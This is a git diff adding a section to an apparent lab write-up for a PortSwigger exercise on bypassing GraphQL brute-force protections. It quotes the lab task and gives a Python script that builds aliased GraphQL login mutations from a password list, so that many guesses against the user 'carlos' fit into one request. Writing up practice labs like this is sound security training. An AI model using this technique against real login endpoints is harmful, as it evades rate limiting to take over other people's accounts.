@@ -218,5 +218,37 @@ LAB SOLVED!
 
 <img width="589" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/48870f4e-47ac-491c-a94c-e7f59902d56c">
 
+***
 
+## 4. Lab: Bypassing GraphQL brute force protections
 
+* Content:
+```
+The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.
+
+To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.
+
+We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater.
+
+For more information on using InQL, see Working with GraphQL in Burp Suite.
+```
+* Exploit:
+
+Đoạn code sinh payload: 
+
+```python
+input1 = "(input:{password: "
+
+input2 = """\\", username: \\"carlos\\"}) {
+		token
+		success
+	}"""
+
+#print(input)
+i=0
+with open('pass.txt') as f:
+    for line in f:
+        i+=1
+        output = "bruteForce" + str(i) + ":login" + input1 + "\\\"" + line.strip() + input2
+        print(output)
+```
